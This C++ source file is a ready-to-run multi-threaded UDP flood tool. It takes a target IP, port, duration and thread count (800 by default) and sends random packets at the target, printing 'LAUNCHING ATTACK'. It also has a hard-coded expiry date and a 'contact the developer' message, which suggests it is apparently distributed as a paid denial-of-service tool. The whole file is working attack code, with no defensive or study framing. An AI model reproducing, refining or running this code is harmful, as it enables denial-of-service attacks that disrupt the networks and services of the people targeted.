#include <iostream>
#include <cstring>
#include <cstdlib>
#include <ctime>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <vector>
#include <thread>
#include <mutex>

#define PACKET_SIZE 9999999
#define PAYLOAD_SIZE 1040

const int EXPIRY_DAY = 20;
const int EXPIRY_MONTH = 12;
const int EXPIRY_YEAR = 2024;
const int DEFAULT_THREAD_COUNT = 800;

std::mutex log_mutex;

// Function to generate a random payload for UDP packets
void generate_payload(char *buffer, size_t size) {
    static const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    for (size_t i = 0; i < size; ++i) {
        buffer[i] = charset[rand() % (sizeof(charset) - 1)];
    }
}

// Function to check if the binary has expired
bool is_binary_expired() {
    time_t now = time(nullptr);
    struct tm *current_time = localtime(&now);

    return (current_time->tm_year + 1900 > EXPIRY_YEAR) ||
           (current_time->tm_year + 1900 == EXPIRY_YEAR && current_time->tm_mon + 1 > EXPIRY_MONTH) ||
           (current_time->tm_year + 1900 == EXPIRY_YEAR && current_time->tm_mon + 1 == EXPIRY_MONTH &&
            current_time->tm_mday > EXPIRY_DAY);
}

// Function to calculate and print remaining time
void print_remaining_time(time_t start_time, int total_duration, int thread_id) {
    while (time(nullptr) - start_time < total_duration) {
        int elapsed = static_cast<int>(time(nullptr) - start_time);
        int remaining = total_duration - elapsed;
        std::lock_guard<std::mutex> lock(log_mutex);
        std::cout << "Thread " << thread_id << " - Time remaining: " << remaining << " seconds." << std::endl;
        std::this_thread::sleep_for(std::chrono::seconds(1)); // Update every second
    }
}

// Function to perform UDP attack in a thread
void udp_attack_thread(const char *ip, int port, int attack_time, int thread_id) {
    sockaddr_in server_addr{};
    char buffer[PAYLOAD_SIZE];

    // Create a UDP socket
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) {
        std::lock_guard<std::mutex> lock(log_mutex);
        std::cerr << "Thread " << thread_id << " - Error: Unable to create socket. " << strerror(errno) << std::endl;
        return;
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    
    // Convert IP address from text to binary form
    if (inet_pton(AF_INET, ip, &server_addr.sin_addr) <= 0) {
        std::lock_guard<std::mutex> lock(log_mutex);
        std::cerr << "Thread " << thread_id << " - Error: Invalid IP address - " << ip << std::endl;
        close(sock);
        return;
    }

    generate_payload(buffer, PAYLOAD_SIZE);

    time_t start_time = time(nullptr);

    // Start a thread to monitor remaining time
    std::thread timer_thread(print_remaining_time, start_time, attack_time, thread_id);

    while (time(nullptr) - start_time < attack_time) {
        ssize_t sent = sendto(sock, buffer, PAYLOAD_SIZE, 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
        if (sent < 0) {
            std::lock_guard<std::mutex> lock(log_mutex);
            std::cerr << "Thread " << thread_id << " - Error: Failed to send packet. " << strerror(errno) << std::endl;
        }
    }

    close(sock);
    
    // Wait for timer thread to finish before logging completion
    timer_thread.join();
    
    std::lock_guard<std::mutex> lock(log_mutex);
    std::cout << "Thread " << thread_id << " has finished." << std::endl;
}

// Function to launch multiple threads for the UDP attack
void multi_threaded_udp_attack(const char *ip, int port, int attack_time, int thread_count) {
    std::vector<std::thread> threads;

    std::cout << "LAUNCHING ATTACK WITH " << thread_count << " THREADS..." << std::endl;

    // Create and start threads
    for (int i = 0; i < thread_count; ++i) {
        threads.emplace_back(udp_attack_thread, ip, port, attack_time, i + 1);
    }

    // Wait for all threads to finish
    for (auto &thread : threads) {
        if (thread.joinable()) {
            thread.join();
        }
    }

    std::cout << "All threads have completed." << std::endl;
}

// Function to get the number of threads from command line arguments
int get_thread_count(int argc, char *argv[]) {
    if (argc == 5) {
        return std::stoi(argv[4]);  // Get thread count from argument if provided
    }
    return DEFAULT_THREAD_COUNT;  // Use default thread count if not provided
}

int main(int argc, char *argv[]) {
    if (argc != 4 && argc != 5) {
        std::cerr << "Usage: " << argv[0] << " <IP> <Port> <Time> [Threads]" << std::endl;
        return EXIT_FAILURE;
    }

    const char *ip = argv[1];
    int port = std::stoi(argv[2]);
    int duration = std::stoi(argv[3]);
    
    // Determine thread count
    int thread_count = get_thread_count(argc, argv);  

    // Check if the binary has expired
    if (is_binary_expired()) {
        std::cerr << "ERROR: THIS BINARY HAS EXPIRED. PLEASE CONTACT THE DEVELOPER." << std::endl;
        return EXIT_FAILURE;
    }

    // Perform the multi-threaded attack
    multi_threaded_udp_attack(ip, port, duration, thread_count);

    return EXIT_SUCCESS;
}